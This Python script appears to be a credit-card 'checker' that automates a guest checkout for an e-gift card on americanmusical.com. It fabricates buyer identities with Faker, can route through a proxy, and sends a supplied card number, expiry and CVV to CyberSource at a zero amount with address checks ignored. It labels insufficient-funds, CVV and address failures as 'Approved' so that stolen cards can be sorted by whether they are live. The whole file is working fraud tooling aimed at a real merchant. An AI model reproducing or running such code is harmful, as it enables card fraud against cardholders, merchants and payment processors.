import httpx
import uuid
import traceback
from faker import Faker

async def cyberchaseccn(cc, mes, ano, cvv, proxy=None):
    try:
        fake = Faker()
        session = httpx.AsyncClient(proxies=proxy, timeout=30)
        ip = await session.get('https://api.ipify.org?format=json')
        print(ip.text)
        email = str(uuid.uuid4())[:8]+"@gmail.com"
        email2 = str(uuid.uuid4())[:8]+"@gmail.com"

        # Datos del usuario
        street = fake.street_address()
        phone = "5515235412"
        name = fake.first_name()
        last = fake.last_name()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        response = await session.get('https://www.americanmusical.com/p/american-musical-supply-e-gift-certificate-99', headers=headers)
        r1 = response.text


        form_key = r1.split('name="form_key" type="hidden" value="')[1].split('"')[0]

        cookies = {'form_key': form_key}

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.5',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryaAhGu4VjeYuCkqrl',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MjIwMDMiLCJhcCI6IjExMjAxMzkzMTciLCJpZCI6ImQzYTZlZjI3ZGNjZWVhMzEiLCJ0ciI6IjA3NjMwNDUzYjljM2RkZTAxNGYyYmQ4MDVhZGE2MTU1IiwidGkiOjE3MzQ0Nzk0MjgzNDEsInRrIjoiMTMyMjg0MCJ9fQ==',
            'origin': 'https://www.americanmusical.com',
            'priority': 'u=1, i',
            'referer': 'https://www.americanmusical.com/p/american-musical-supply-e-gift-certificate-99',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'traceparent': '00-07630453b9c3dde014f2bd805ada6155-d3a6ef27dcceea31-01',
            'tracestate': '1322840@nr=0-1-3722003-1120139317-d3a6ef27dcceea31----1734479428341',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-newrelic-id': 'VwEFU1ZTCxABVFlSDgQFX1UJ',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = f'------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="product"\r\n\r\n395775\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="selected_configurable_option"\r\n\r\n\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="related_product"\r\n\r\n\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="item"\r\n\r\n395775\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="form_key"\r\n\r\n{form_key}\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="giftcard_sender_name"\r\n\r\n{name}\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="giftcard_sender_email"\r\n\r\n{email}\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="giftcard_recipient_name"\r\n\r\n{last}\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="giftcard_recipient_email"\r\n\r\n{email2}\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="giftcard_message"\r\n\r\n\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="giftcard_amount"\r\n\r\n10\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="gc-amount"\r\n\r\n10\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="options[13]"\r\n\r\n49\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="gc-color"\r\n\r\n49\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl\r\nContent-Disposition: form-data; name="qty"\r\n\r\n1\r\n------WebKitFormBoundaryaAhGu4VjeYuCkqrl--\r\n'

        response = await session.post('https://www.americanmusical.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuYW1lcmljYW5tdXNpY2FsLmNvbS9hbWVyaWNhbi1tdXNpY2FsLXN1cHBseS1lLWdpZnQtY2VydGlmaWNhdGUtOTk~/product/395775/', cookies=cookies, headers=headers, data=data)#type: ignore
        r2 = response.text

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.8',
            'priority': 'u=0, i',
            'referer': 'https://www.americanmusical.com/checkout/cart/',
            'sec-ch-ua': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        response = await session.get('https://www.americanmusical.com/checkout/', headers=headers)
        r3 = response.text

        entity_id = r3.split('"entity_id":"')[1].split('"')[0]
        secure_token = r3.split('"secure_token":"')[1].split('"')[0]
        
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            # 'cookie': 'aw_popup_viewed_popup_2=2; tracker_device_is_opt_in=true; tracker_device=58d39ce7-9adb-4634-9a7b-39d67f6175b4; _gcl_au=1.1.1790113397.1734158694; _ga=GA1.1.880200516.1734158695; _fbp=fb.1.1734158694775.860260562262969360; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; yotpo_pixel=c04f60ff-2885-4a3b-a580-792b80cfa742; PHPSESSID=5604a1cc7586a44d5e5d7236657a6b7c; ams_res_flag=1; X-Magento-Vary=cb5e275ddcd7958970c8cbbd5c0f615d4d908abf13d764a6c7f2a409b1abe776; form_key=35feGROIFnmeAqPH; mage-cache-sessid=true; mage-banners-cache-storage={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=35feGROIFnmeAqPH; _clck=18wh6zl%7C2%7Cfrw%7C0%7C1809; ams_zip_code=07050-3824; MCSessionId=AMS5604a1cc7283127780; mage-messages=; _sp_ses.7862=*; aw_popup_viewed_page=%5B%22821ce9b70c92b25a46105108cf180152078e5e0f8d2d4314a90f9f2dce16cb5b%22%2C%227643d373d58dd41ae857a651aac6d4086f2fe9742aeb96fde0aac837f811b432%22%2C%226dbdb8533e459e085728a08dbbb98f23cb83058f0f6e099a52a39d2879c5282e%22%2C%22a9ac90ecbdebc0fc50ccf937d12ccd14c1031b56d04507d2bd406daa443a8366%22%2C%2233ba25fedc2a33de412f9afb24a28e4b0c2da32354201a337ebe6a806a835715%22%2C%22e7ea9b5f53140aaa3d589eee043a0373d19d336d7f159007fd3d34bf1914944b%22%5D; _sp_id.7862=fac0f6d812974dba.1734072581.10.1734759308.1734755592; private_content_version=66df2ba0864b272724088237e5fd1e7e; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Dec+20+2024+22%3A37%3A41+GMT-0700+(hora+est%C3%A1ndar+del+Pac%C3%ADfico+de+M%C3%A9xico)&version=202410.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=a56497b6-6ab8-41fd-9920-8261f61acd00&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C2%3A1%2C3%3A1%2CBG35%3A1%2C4%3A1&AwaitingReconsent=false; _uetsid=ac345350bf5411efbb5c2b702d6eb21d; _uetvid=69c67da0b91e11ef81aabdaefa57b39c; _clsk=1u7lnpj%7C1734759464430%7C13%7C1%7Co.clarity.ms%2Fcollect; _ga_DQH5CM9S2F=GS1.1.1734759267.6.1.1734759471.40.0.0; section_data_ids={%22customer%22:1734755585%2C%22compare-products%22:1734755585%2C%22last-ordered-items%22:1734755585%2C%22cart%22:1734759311%2C%22directory-data%22:1734759311%2C%22captcha%22:1734755777%2C%22wishlist%22:1734755585%2C%22instant-purchase%22:1734755585%2C%22loggedAsCustomer%22:1734755585%2C%22multiplewishlist%22:1734755585%2C%22persistent%22:1734759267%2C%22review%22:1734755585%2C%22ams_gtm%22:1734759311%2C%22wp_confirmation_popup%22:1734759311%2C%22recaptcha%22:1734755585%2C%22makePaymentLinkStatus%22:1734755585%2C%22recently_viewed_product%22:1734755585%2C%22recently_compared_product%22:1734755585%2C%22product_data_storage%22:1734755585%2C%22paypal-billing-agreement%22:1734755585%2C%22messages%22:null}',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MjIwMDMiLCJhcCI6IjExMjAxMzkzMTciLCJpZCI6ImM2MDZmN2ZmMThiMmM5NjMiLCJ0ciI6IjQzMjMwYTRmZDEwYzQxOWU3Mzg0ZDI4MTlkY2JmZDE0IiwidGkiOjE3MzQ3NTk0OTI5OTYsInRrIjoiMTMyMjg0MCJ9fQ==',
            'origin': 'https://www.americanmusical.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.americanmusical.com/checkout/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': '00-43230a4fd10c419e7384d2819dcbfd14-c606f7ff18b2c963-01',
            'tracestate': '1322840@nr=0-1-3722003-1120139317-c606f7ff18b2c963----1734759492996',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-newrelic-id': 'VwEFU1ZTCxABVFlSDgQFX1UJ',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'address': {
                'street': [
                    '103105 Central Avenue',
                    '',
                ],
                'city': 'Orange',
                'region_id': '121',
                'region': 'New Jersey',
                'country_id': 'US',
                'postcode': '07050-3824',
                'firstname': 'Sebastian',
                'lastname': 'Gutierrez',
                'company': '',
                'telephone': '5059947000',
                'custom_attributes': [
                    {
                        'attribute_code': 'telephone',
                        'value': '5059947000',
                    },
                    {
                        'attribute_code': 'ext_num',
                        'value': '',
                    },
                    {
                        'attribute_code': 'phone_secondary',
                        'value': '',
                    },
                    {
                        'attribute_code': 'ext_secondary',
                        'value': '',
                    },
                    {
                        'attribute_code': 'ams_address_type',
                        'value': 'residential',
                    },
                ],
            },
        }

        response = await session.post(
            'https://www.americanmusical.com/rest/default/V1/guest-carts/Z1cI8VsJPt6bIO1qvOWXrSleeTfFFz29/estimate-shipping-methods',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )



        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.5',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MjIwMDMiLCJhcCI6IjExMjAxMzkzMTciLCJpZCI6IjdhOTRiNjc4N2ZkODQ4NmIiLCJ0ciI6ImM3Mjc3MDNlOGVmOWI2ZWZjMDMzNjg3ZWM2ZDQxNWY1IiwidGkiOjE3MzQ0Nzk2NDU0OTEsInRrIjoiMTMyMjg0MCJ9fQ==',
            'origin': 'https://www.americanmusical.com',
            'priority': 'u=1, i',
            'referer': 'https://www.americanmusical.com/checkout/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'traceparent': '00-c727703e8ef9b6efc033687ec6d415f5-7a94b6787fd8486b-01',
            'tracestate': '1322840@nr=0-1-3722003-1120139317-7a94b6787fd8486b----1734479645491',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-newrelic-id': 'VwEFU1ZTCxABVFlSDgQFX1UJ',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'addressInformation': {
                'shipping_address': {
                    'countryId': 'US',
                    'regionId': '127',
                    'region': '',
                    'street': [street],
                    'company': '',
                    'telephone': phone,
                    'postcode': '10080',
                    'city': 'New York',
                    'firstname': name,
                    'lastname': last,
                    'customAttributes': [
                        {'attribute_code': 'telephone', 'value': '5515235412'},
                        {'attribute_code': 'ext_num', 'value': ''},
                        {'attribute_code': 'phone_secondary', 'value': ''},
                        {'attribute_code': 'ext_secondary', 'value': ''},
                        {'attribute_code': 'ams_address_type', 'value': 'residential'},
                    ],
                },
                'billing_address': {
                    'countryId': 'US',
                    'regionId': '127',
                    'region': '',
                    'street': [street],
                    'company': '',
                    'telephone': phone,
                    'postcode': '10080',
                    'city': 'New York',
                    'firstname': name,
                    'lastname': last,
                    'customAttributes': [
                        {'attribute_code': 'telephone', 'value': '5515235412'},
                        {'attribute_code': 'ext_num', 'value': ''},
                        {'attribute_code': 'phone_secondary', 'value': ''},
                        {'attribute_code': 'ext_secondary', 'value': ''},
                        {'attribute_code': 'ams_address_type', 'value': 'residential'},
                    ],
                    'saveInAddressBook': None,
                },
                'shipping_method_code': 'amsshipping',
                'shipping_carrier_code': 'amsshipping',
                'extension_attributes': {},
            },
        }

        response = await session.post(f'https://www.americanmusical.com/rest/default/V1/guest-carts/{entity_id}/shipping-information', headers=headers, json=json_data)
        r4 = response.text
        
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            # 'cookie': 'aw_popup_viewed_popup_2=2; tracker_device_is_opt_in=true; tracker_device=58d39ce7-9adb-4634-9a7b-39d67f6175b4; _gcl_au=1.1.1790113397.1734158694; _ga=GA1.1.880200516.1734158695; _fbp=fb.1.1734158694775.860260562262969360; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; yotpo_pixel=c04f60ff-2885-4a3b-a580-792b80cfa742; PHPSESSID=5604a1cc7586a44d5e5d7236657a6b7c; ams_res_flag=1; X-Magento-Vary=cb5e275ddcd7958970c8cbbd5c0f615d4d908abf13d764a6c7f2a409b1abe776; form_key=35feGROIFnmeAqPH; mage-cache-sessid=true; mage-banners-cache-storage={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=35feGROIFnmeAqPH; _clck=18wh6zl%7C2%7Cfrw%7C0%7C1809; ams_zip_code=07050-3824; MCSessionId=AMS5604a1cc7283127780; mage-messages=; _sp_ses.7862=*; aw_popup_viewed_page=%5B%22821ce9b70c92b25a46105108cf180152078e5e0f8d2d4314a90f9f2dce16cb5b%22%2C%227643d373d58dd41ae857a651aac6d4086f2fe9742aeb96fde0aac837f811b432%22%2C%226dbdb8533e459e085728a08dbbb98f23cb83058f0f6e099a52a39d2879c5282e%22%2C%22a9ac90ecbdebc0fc50ccf937d12ccd14c1031b56d04507d2bd406daa443a8366%22%2C%2233ba25fedc2a33de412f9afb24a28e4b0c2da32354201a337ebe6a806a835715%22%2C%22e7ea9b5f53140aaa3d589eee043a0373d19d336d7f159007fd3d34bf1914944b%22%5D; _sp_id.7862=fac0f6d812974dba.1734072581.10.1734759308.1734755592; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Dec+20+2024+22%3A37%3A41+GMT-0700+(hora+est%C3%A1ndar+del+Pac%C3%ADfico+de+M%C3%A9xico)&version=202410.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=a56497b6-6ab8-41fd-9920-8261f61acd00&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C2%3A1%2C3%3A1%2CBG35%3A1%2C4%3A1&AwaitingReconsent=false; _uetsid=ac345350bf5411efbb5c2b702d6eb21d; _uetvid=69c67da0b91e11ef81aabdaefa57b39c; _clsk=1u7lnpj%7C1734759464430%7C13%7C1%7Co.clarity.ms%2Fcollect; _ga_DQH5CM9S2F=GS1.1.1734759267.6.1.1734759493.18.0.0; section_data_ids={%22customer%22:1734755585%2C%22compare-products%22:1734755585%2C%22last-ordered-items%22:1734755585%2C%22cart%22:1734759311%2C%22directory-data%22:1734759311%2C%22captcha%22:1734755777%2C%22wishlist%22:1734755585%2C%22instant-purchase%22:1734755585%2C%22loggedAsCustomer%22:1734755585%2C%22multiplewishlist%22:1734755585%2C%22persistent%22:1734759267%2C%22review%22:1734755585%2C%22ams_gtm%22:1734759311%2C%22wp_confirmation_popup%22:1734759311%2C%22recaptcha%22:1734755585%2C%22makePaymentLinkStatus%22:1734755585%2C%22recently_viewed_product%22:1734755585%2C%22recently_compared_product%22:1734755585%2C%22product_data_storage%22:1734755585%2C%22paypal-billing-agreement%22:1734755585%2C%22messages%22:1734759493}; private_content_version=54fd89d5d76d96cb7e03a13fc121b369',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MjIwMDMiLCJhcCI6IjExMjAxMzkzMTciLCJpZCI6ImI2MDk3NmJkZGI3ODFmYTYiLCJ0ciI6IjI5NGI1ODFlZTViMDczNjBmNmM0MmY0ZTY0NmMyMjYyIiwidGkiOjE3MzQ3NTk0OTU2MzgsInRrIjoiMTMyMjg0MCJ9fQ==',
            'origin': 'https://www.americanmusical.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.americanmusical.com/checkout/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': '00-294b581ee5b07360f6c42f4e646c2262-b60976bddb781fa6-01',
            'tracestate': '1322840@nr=0-1-3722003-1120139317-b60976bddb781fa6----1734759495638',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-newrelic-id': 'VwEFU1ZTCxABVFlSDgQFX1UJ',
            'x-requested-with': 'XMLHttpRequest',
        }

        json_data = {
            'addressInformation': {
                'address': {
                    'countryId': 'US',
                    'region': 'New Jersey',
                    'regionId': '121',
                    'postcode': '07050-3824',
                    'street': [
                        '103105 Central Avenue',
                        '',
                    ],
                },
                'shipping_method_code': 'amsshipping',
                'shipping_carrier_code': 'amsshipping',
            },
        }

        response = await session.post(
            'https://www.americanmusical.com/rest/default/V1/guest-carts/Z1cI8VsJPt6bIO1qvOWXrSleeTfFFz29/totals-information',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        one = cc[0:1]
        if one == "4":
            cc_type = "VI"
        elif one == "5":
            cc_type = "MC"
        elif one == "3":
            cc_type = "AE"
        elif one == "6":
            cc_type = "DC"

        mes = int(mes)
        last4 = cc[4:]

        json_data = {
            'cartId': entity_id,
            'paymentMethod': {
                'method': 'chcybersource',
            },
            'email': email,
        }

        response = await session.post(
            f'https://www.americanmusical.com/rest/default/V1/guest-carts/{entity_id}/set-payment-information',
            headers=headers,
            json=json_data
        )
        r4 = response.text

        json_data = {
            'cartId': entity_id,
            'billingAddress': {
                'countryId': 'US',
                'regionId': '127',
                'regionCode': 'NY',
                'region': 'New York',
                'street': [street],
                'telephone': phone,
                'postcode': '10080',
                'city': 'New York',
                'firstname': name,
                'lastname': last,
                'customAttributes': [
                    {'attribute_code': 'telephone', 'value': '5515235412'},
                    {'attribute_code': 'ext_num', 'value': ''},
                    {'attribute_code': 'phone_secondary', 'value': ''},
                    {'attribute_code': 'ext_secondary', 'value': ''},
                    {'attribute_code': 'ams_address_type', 'value': 'residential'},
                ],
                'saveInAddressBook': None,
            },
            'paymentMethod': {
                'method': 'chcybersource',
                'additional_data': {
                    'ccType': cc_type,
                    'is_active_payment_token_enabler': True,
                },
            },
            'email': email,
        }

        response = await session.post(
            f'https://www.americanmusical.com/rest/default/V1/guest-carts/{entity_id}/payment-information',
            headers=headers,
            json=json_data
        )
        r5 = response.text

        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MjIwMDMiLCJhcCI6IjExMjAxMzkzMTciLCJpZCI6ImFiOTMzZjQ3YjY2ZGIxNjgiLCJ0ciI6ImRkNDA0NGE0MGQ4OWEyN2FkMmEyMWIyMjNhZjNkNTAyIiwidGkiOjE3MzQ0Nzk5MDIzMjgsInRrIjoiMTMyMjg0MCJ9fQ==',
            'origin': 'https://www.americanmusical.com',
            'priority': 'u=1, i',
            'referer': 'https://www.americanmusical.com/checkout/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'traceparent': '00-dd4044a40d89a27ad2a21b223af3d502-ab933f47b66db168-01',
            'tracestate': '1322840@nr=0-1-3722003-1120139317-ab933f47b66db168----1734479902328',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-newrelic-id': 'VwEFU1ZTCxABVFlSDgQFX1UJ',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'form_key': form_key,
            'captcha_form_id': 'payment_processing_request',
            'secure_token': secure_token,
            'payment[method]': 'chcybersource',
            'saved_cc': '',
            'billing-address-same-as-shipping': 'on',
            'controller': 'checkout_flow',
            'cc_type': cc_type,
        }

        response = await session.post('https://www.americanmusical.com/cybersource/index/loadSilentData/', headers=headers, data=data)
        r6 = response.text

        signature = r6.split('"signature":"')[1].split('"')[0]
        access_key = r6.split('"access_key":"')[1].split('"')[0]
        profile_id = r6.split('"profile_id":"')[1].split('"')[0]
        transaction_uuid = r6.split('"transaction_uuid":"')[1].split('"')[0]
        unsigned_field_names = r6.split('"unsigned_field_names":"')[1].split('"')[0]
        transaction_type = r6.split('"transaction_type":"')[1].split('"')[0]
        reference_number = r6.split('"reference_number":"')[1].split('"')[0]
        merchant_secure_data1 = r6.split('"merchant_secure_data1":"')[1].split('"')[0]
        merchant_secure_data2 = r6.split('"merchant_secure_data2":"')[1].split('"')[0]
        merchant_secure_data3 = r6.split('"merchant_secure_data3":"')[1].split('"')[0]
        merchant_defined_data6 = r6.split('"merchant_defined_data6":"')[1].split('"')[0]
        merchant_defined_data32 = r6.split('"merchant_defined_data32":"')[1].split('"')[0]
        merchant_defined_data31 = r6.split('"merchant_defined_data31":"')[1].split('"')[0]
        merchant_defined_data23 = r6.split('"merchant_defined_data23":"')[1].split('"')[0]
        signed_date_time = r6.split('"signed_date_time":"')[1].split('"')[0]
        signed_field_names = r6.split('"signed_field_names":"')[1].split('"')[0]
        customer_ip_address = r6.split('"customer_ip_address":"')[1].split('"')[0]

        merchant_secure_data2 = merchant_secure_data2.replace('\\', '')
        signature = signature.replace('\\', '')

        if one == '4':
            tipo = '001'
        elif one == '5':
            tipo = '002'
        elif one == "3":
            tipo = '003'
        elif one == "6":
            tipo = '004'

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.8',
            'cache-control': 'max-age=0',
            'origin': 'https://www.americanmusical.com',
            'priority': 'u=0, i',
            'referer': 'https://www.americanmusical.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'access_key': access_key,
            'profile_id': profile_id,
            'partner_solution_id': '04FVDITH',
            'locale': 'en-us',
            'reference_number': reference_number,
            'currency': 'USD',
            'amount': '0.00',
            'transaction_uuid': transaction_uuid,
            'merchant_secure_data1': merchant_secure_data1,
            'merchant_secure_data3': merchant_secure_data3,
            'bill_to_forename': name,
            'bill_to_surname': last,
            'bill_to_email': email,
            'bill_to_address_city': fake.city(),
            'bill_to_address_state': fake.state(),
            'bill_to_address_country': 'US',
            'bill_to_address_postal_code': fake.zipcode(),
            'bill_to_phone': phone,
            'bill_to_address_line1': street,
            'ship_to_forename': name,
            'ship_to_surname': last,
            'ship_to_email': email,
            'ship_to_address_city': fake.city(),
            'ship_to_address_state': fake.state(),
            'ship_to_address_country': 'US',
            'ship_to_address_postal_code': fake.zipcode(),
            'ship_to_phone': phone,
            'ship_to_address_line1': street,
            'transaction_type': transaction_type,
            'payment_method': 'card',
            'card_type': tipo,
            'card_type_selection_indicator': '1',
            'unsigned_field_names': unsigned_field_names,
            'merchant_secure_data2': merchant_secure_data2,
            'merchant_defined_data6': merchant_defined_data6,
            'merchant_defined_data23': merchant_defined_data23,
            'merchant_defined_data31': merchant_defined_data31,
            'merchant_defined_data32': merchant_defined_data32,
            'customer_ip_address': customer_ip_address,
            'ignore_avs': 'true',
            'override_custom_receipt_page': 'https://www.americanmusical.com/cybersource/index/placeorder/',
            'override_custom_cancel_page': 'https://www.americanmusical.com/cybersource/index/cancel/',
            'payer_auth_enroll_service_run': 'true',
            'signed_date_time': signed_date_time,
            'signed_field_names': signed_field_names,
            'signature': signature,
            'card_cvn': cvv,
            'card_expiry_date': f"{mes}-{ano}",
            'card_number': cc,
        }

        response = await session.post('https://secureacceptance.cybersource.com/silent/pay', headers=headers, data=data)
        r7 = response.text
        with open('r7.html', 'w', encoding='utf-8') as f:
            f.write(r7)

        await session.aclose()

        try:
            if 'Request was processed successfully.' in r7 or 'ACCEPT' in r7:
                status = 'Approved ✅'
                mensaje = '100: Request was processed successfully.'
            else:
                mensaje = r7.split('id="message" value="')[1].split('"')[0]
                if 'Reason:' in mensaje:
                    mensaje = mensaje.split('Reason:')[1].strip()
                try:
                    reason_code = r7.split('id="reason_code" value="')[1].split('"')[0]
                    auth_code = r7.split('id="auth_response" value="')[1].split('"')[0]
                except:
                    reason_code = 'None'
                    auth_code = 'None'

                try:
                    if "funds" in mensaje.lower() or 'balance' in mensaje.lower() or 'Credit Floor' in mensaje:
                        res = 'Approved ✅'
                    elif "CVV2" in mensaje or 'CVV' in mensaje or 'CVC2' in mensaje:
                        status = 'Approved ✅'
                    elif "AVS check failed" in mensaje:
                        status = 'Approved ✅'
                    elif '51' in auth_code:
                        status = 'Approved ✅'
                        mensaje = 'NOT FUNDS'
                    else:
                        status = 'Declined ❌'
                except Exception as e:
                    status = 'Error ⚠️'
                    mensaje = f"{str(e)}"

                mensaje = f"{reason_code}: {mensaje}"

            return status, mensaje

        except Exception as e:
            status = 'Error ⚠️'
            mensaje = f"{str(e)}"
            return status, mensaje

    except Exception as e:
        await session.aclose()
        linea = str(e.__traceback__.tb_lineno) #type: ignore
        print(f"Error en CyberChase_Charged, la linea: {linea} {str(e)}")
        res = "$Error_ ⚠️"
        traceback_str = traceback.format_exc()
        mensaje = f"{e} | {traceback_str}"
        avs = "None"
        cvv2 = "None"
        return res, mensaje, avs, cvv2